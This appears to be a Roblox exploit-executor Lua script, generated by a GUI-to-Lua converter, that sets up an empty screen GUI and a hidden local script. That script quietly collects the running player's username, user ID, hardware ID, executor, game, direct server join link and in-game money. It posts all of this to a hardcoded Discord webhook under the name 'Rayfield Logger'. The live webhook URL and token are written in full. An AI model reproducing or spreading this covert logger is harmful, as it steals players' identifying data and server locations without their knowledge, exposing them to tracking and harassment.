-- Gui to Lua V5.1 (Shadow Edition)
-- GUI : 2WEBHOOK_URL

local Players   = game:GetService('Players')
local player    = Players.LocalPlayer
local PlayerGui = player:WaitForChild('PlayerGui')

local _old = PlayerGui:FindFirstChild([[2WEBHOOK_URL]])
if _old then _old:Destroy() end

local _i = {}

-- Instances:

_i[1] = Instance.new("ScreenGui")
_i[1].DisplayOrder = 0
_i[1].Enabled = true
_i[1].IgnoreGuiInset = false
_i[1].ResetOnSpawn = true
_i[1].Name = [[2WEBHOOK_URL]]


-- FAKE REQUIRE SYSTEM FOR MODULES
local _modules = {}
local old_require = require
local require = function(module)
	if _modules[module] then
		if type(_modules[module]) == 'function' then
			_modules[module] = _modules[module]()
		end
		return _modules[module]
	end
	return old_require(module)
end

-- Scripts:

local function VOFXB_fake_script()
	local script = Instance.new('LocalScript')
	script.Name = [[LocalScript]]
	script.Parent = _i[1]

	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local HttpService = game:GetService("HttpService")
	local MarketplaceService = game:GetService("MarketplaceService")
	
	-- ==========================================
	-- 1. DÉTECTION EXÉCUTEUR & HWID
	-- ==========================================
	local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
	local executorName = identifyexecutor and identifyexecutor() or "Exécuteur Inconnu"
	
	local hwid = "Non supporté par l'exécuteur"
	task.spawn(function()
		pcall(function() hwid = gethwid and gethwid() or get_hwid and get_hwid() or get_hardware_id and get_hardware_id() or hwid end)
	end)
	
	
	 
	-- ==========================================
	-- 2. FONCTION WEBHOOK DISCORD (LOGGING COMPLET)
	-- ==========================================
	local function GetRealHeadShotAPI(userId)
		local fallbackImage = "https://tr.rbxcdn.com/53eb9b17fe1432a809c73a132d79f09c/420/420/Image/Png"
		if not httpRequest then return fallbackImage end
	
		local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..tostring(userId).."&size=420x420&format=Png&isCircular=false"
		local success, response = pcall(function()
			return httpRequest({ Url = url, Method = "GET" })
		end)
	
		if success and response and response.Body then
			local data = HttpService:JSONDecode(response.Body)
			if data and data.data and data.data[1] and data.data[1].imageUrl then
				return data.data[1].imageUrl 
			end
		end
		return fallbackImage
	end
	
	-- 3. ENVOI DU WEBHOOK
	if httpRequest then
		spawn(function()
			-- Récupération du vrai nom du jeu
			local successGame, gameInfo = pcall(function()
				return MarketplaceService:GetProductInfo(game.PlaceId)
			end)
			local gameName = successGame and gameInfo.Name or "Nom du jeu inconnu"
	
			-- Les vrais liens (Page Web + Lien direct serveur)
			local webLink = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
			local joinLink = "roblox://experiences/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(game.JobId)
	
			-- Récupération des statistiques du joueur
			local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
			local humanoid = char:WaitForChild("Humanoid", 5)
			local walkSpeed = humanoid and tostring(humanoid.WalkSpeed) or "Inconnu"
			local jumpPower = humanoid and tostring(humanoid.JumpPower) or "Inconnu"
	
			-- Récupération de l'argent (Leaderstats)
			local moneyInfo = "Non détecté"
			if LocalPlayer:FindFirstChild("leaderstats") then
				local stats = {}
				for _, stat in ipairs(LocalPlayer.leaderstats:GetChildren()) do
					table.insert(stats, stat.Name .. ": " .. tostring(stat.Value))
				end
				if #stats > 0 then moneyInfo = table.concat(stats, " | ") end
			end
	
			local myAvatar = GetRealHeadShotAPI(LocalPlayer.UserId)
	
			-- Construction du message Discord (Embed)
			local payload = {
				["username"] = "Rayfield Logger",
				["avatar_url"] = myAvatar,
				["content"] = "", 
				["embeds"] = {{
					["title"] = "🟢 Script Rayfield Activé",
					["description"] = "Un joueur a exécuté le script avec **" .. executorName .. "**.",
					["color"] = 65280,
					["thumbnail"] = {
						["url"] = myAvatar
					},
					["fields"] = {
						-- Infos Joueur
						{["name"] = "👤 Pseudo", ["value"] = "``" .. LocalPlayer.Name .. "``", ["inline"] = true},
						{["name"] = "🏷️ Surnom", ["value"] = "``" .. LocalPlayer.DisplayName .. "``", ["inline"] = true},
						{["name"] = "🆔 ID Joueur", ["value"] = "``" .. tostring(LocalPlayer.UserId) .. "``", ["inline"] = true},
						{["name"] = "💻 HWID (Machine ID)", ["value"] = "``" .. hwid .. "``", ["inline"] = false},
	
						-- Infos Jeu
						{["name"] = "🎮 Jeu Actuel", ["value"] = gameName, ["inline"] = true},
						{["name"] = "🌍 PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true},
	
						-- VRAIS LIENS ICI
						{["name"] = "🔗 Page web du jeu", ["value"] = webLink, ["inline"] = false},
						{["name"] = "🚀 Rejoindre son serveur", ["value"] = "Lien direct PC : \n`" .. joinLink .. "`\n\nJobId (pour extensions) : \n`" .. game.JobId .. "`", ["inline"] = false},
	
						-- Stats
						{["name"] = "🏃 Vitesse", ["value"] = walkSpeed, ["inline"] = true},
						{["name"] = "🦘 Saut", ["value"] = jumpPower, ["inline"] = true},
						{["name"] = "💰 Argent", ["value"] = moneyInfo, ["inline"] = false}
					},
					["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
				}}
			}
	
			-- Envoi au Webhook
			httpRequest({
				Url = "https://discord.com/api/webhooks/1525886709642821856/GDcC5e1IYznLZvkWIOUsELzmGAVc9cx04j6W7nKnTUfhtikdxtuWMFaEoEQceDoptD4U",
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = HttpService:JSONEncode(payload)
			})
		end)
	end
	
	
	
end
coroutine.wrap(VOFXB_fake_script)()


_i[1].Parent = PlayerGui
